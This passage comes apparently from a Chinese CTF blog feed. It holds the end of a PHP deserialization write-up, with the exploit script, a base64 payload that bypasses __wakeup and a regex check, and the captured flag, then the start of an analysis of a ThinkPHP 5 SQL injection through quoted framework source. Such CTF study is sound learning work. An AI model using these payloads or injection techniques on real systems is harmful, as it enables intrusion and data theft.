</code></pre><p><em><strong>isset</strong></em>检查是否输入<em><strong>var</strong></em>，然后对<em><strong>var</strong></em>进行<em><strong>base64</strong></em>解码。<br><em><strong>preg_match</strong></em>进行正则表达式匹配。<br>全部绕过后会对<em><strong>var</strong></em>进行一次反序列化（会调用***__wakeup***）。<br>接下来分析类</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><p>定义了一个<em><strong>private</strong></em>属性变量，分析<em><strong>__wakeup</strong></em>发现它强制将<em><strong>file</strong></em>的值改为<em><strong>index.php</strong></em>同时告知我们flag在<em><strong>fl4g.php</strong></em>中。<br>明确目标：1、绕过<em><strong>base64</strong></em>解码。2、绕过<em><strong>preg_match</strong></em>的正则匹配。3、绕过***__wakeup***方法。<br>写一个脚本</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'fl4g.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'1:'</span><span class="token punctuation">,</span> <span class="token string">'2:'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'4:'</span><span class="token punctuation">,</span> <span class="token string">'+4:'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>运行结果</p><pre class=" language-1"><code class="language-1">O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}O:4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></pre><p>最后得到flag。</p><pre class=" language-1"><code class="language-1">$flag="ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}";</code></pre><h2 id="仍存在的一些问题"><a href="#仍存在的一些问题" class="headerlink" title="仍存在的一些问题"></a>仍存在的一些问题</h2><h3 id="在数字前加-绕过preg-match判断"><a href="#在数字前加-绕过preg-match判断" class="headerlink" title="在数字前加+绕过preg_match判断"></a>在数字前加+绕过preg_match判断</h3><p>在这篇博客中<a href="https://www.phpbug.cn/archives/32.html">https://www.phpbug.cn/archives/32.html</a> 有提到</p><pre class=" language-php"><code class="language-php">yy17<span class="token punctuation">:</span>         yych <span class="token operator">=</span> <span class="token operator">*</span><span class="token operator">++</span><span class="token constant">YYCURSOR</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>yybm<span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">+</span>yych<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token keyword">goto</span> yy20<span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>yych <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> yy19<span class="token punctuation">;</span> yy19<span class="token punctuation">:</span>         yych <span class="token operator">=</span> <span class="token operator">*</span><span class="token operator">++</span><span class="token constant">YYCURSOR</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>yybm<span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">+</span>yych<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token keyword">goto</span> yy20<span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">goto</span> yy18<span class="token punctuation">;</span></code></pre><p>大致意思为，如果判断下一位字符是数字就goto yy20，如果是’+’就goto yy19，yy19则是对下一位字符的判断，如果下一位字符是数字，则继续goto yy20，如果不是则直接退出，那么</p><pre class=" language-1"><code class="language-1">O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}</code></pre><p>第二个式子的+不应该会被绕过吗？是如何实现的终止判断？</p><h3 id="private属性的序列化"><a href="#private属性的序列化" class="headerlink" title="private属性的序列化"></a>private属性的序列化</h3><p><em><strong>private</strong></em>属性序列化后在其属性名前后会多出***/x00<em><strong>，这个东西会自动被网站过滤掉不显示，那为什么不能在</strong></em>base64***加密前手模上去呢？（试了试，没成功）</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 NCTF-web 摆就完事了（2）复现</title>
      <link href="/2021/12/13/2021%20NCTF-web%20%E6%91%86%E5%B0%B1%E5%AE%8C%E4%BA%8B%E4%BA%86%EF%BC%882%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/12/13/2021%20NCTF-web%20%E6%91%86%E5%B0%B1%E5%AE%8C%E4%BA%8B%E4%BA%86%EF%BC%882%EF%BC%89%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2021-NCTF-web-摆就完事了（2）复现"><a href="#2021-NCTF-web-摆就完事了（2）复现" class="headerlink" title="2021 NCTF-web 摆就完事了（2）复现"></a>2021 NCTF-web 摆就完事了（2）复现</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="ThinkPHP5-0-16-amp-5-1-6SQL注入漏洞"><a href="#ThinkPHP5-0-16-amp-5-1-6SQL注入漏洞" class="headerlink" title="ThinkPHP5.0.16&amp;5.1.6SQL注入漏洞"></a>ThinkPHP5.0.16&amp;5.1.6SQL注入漏洞</h3><p>参考学习：<a href="https://www.cesafe.com/html/3631.html">https://www.cesafe.com/html/3631.html</a><br>首先跟入insert，thinkphp/library/think/db/Query.php:2078</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$getLastInsID</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$sequence</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 分析查询表达式</span>    <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseExpress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span>    <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 生成SQL语句</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">builder</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 获取参数绑定</span>    <span class="token variable">$bind</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getBind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 获取实际执行的SQL语句</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connection</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getRealSql</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$bind</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 执行操作</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">===</span> <span class="token variable">$sql</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$bind</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$sequence</span>  <span class="token operator">=</span> <span class="token variable">$sequence</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'sequence'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'sequence'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$lastInsId</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getLastInsID</span><span class="token punctuation">(</span><span class="token variable">$sequence</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$lastInsId</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$pk</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getPk</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$pk</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$lastInsId</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'after_insert'</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$getLastInsID</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$lastInsId</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>发现其进行了***$sql=$this-&gt;builder-&gt;insert($data, $options, $replace);***的构造语句，跟入thinkphp/library/think/db/Builder.php:720：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 分析并处理数据</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseData</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$fields</span> <span class="token operator">=</span> <span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$values</span> <span class="token operator">=</span> <span class="token function">array_values</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>        <span class="token punctuation">[</span><span class="token string">'%INSERT%'</span><span class="token punctuation">,</span> <span class="token string">'%TABLE%'</span><span class="token punctuation">,</span> <span class="token string">'%FIELD%'</span><span class="token punctuation">,</span> <span class="token string">'%DATA%'</span><span class="token punctuation">,</span> <span class="token string">'%COMMENT%'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>            <span class="token variable">$replace</span> <span class="token operator">?</span> <span class="token string">'REPLACE'</span> <span class="token punctuation">:</span> <span class="token string">'INSERT'</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">' , '</span><span class="token punctuation">,</span> <span class="token variable">$fields</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">' , '</span><span class="token punctuation">,</span> <span class="token variable">$values</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseComment</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">insertSql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>使用了parseData函数，跟入thinkphp/library/think/db/Builder.php:101 </p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseData</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 获取绑定信息</span>    <span class="token variable">$bind</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFieldsBind</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'*'</span> <span class="token operator">==</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'field'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$fields</span> <span class="token operator">=</span> <span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token variable">$bind</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$fields</span> <span class="token operator">=</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'field'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$item</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token string">'__toString'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 对象数据写入</span>            <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$fields</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'strict'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">'fields not exists:['</span> <span class="token punctuation">.</span> <span class="token variable">$key</span> <span class="token punctuation">.</span> <span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$item</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'NULL'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">'exp'</span><span class="token punctuation">:</span>                    <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$item</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'inc'</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$item</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'+'</span> <span class="token punctuation">.</span> <span class="token function">floatval</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'dec'</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$item</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-'</span> <span class="token punctuation">.</span> <span class="token function">floatval</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_scalar</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 过滤非标量数据</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isBind</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$item</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">'data__'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$bind</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$bind</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$item</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">':data__'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>分析该switchcase函数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">'exp'</span><span class="token punctuation">:</span>        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$item</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string">'inc'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token 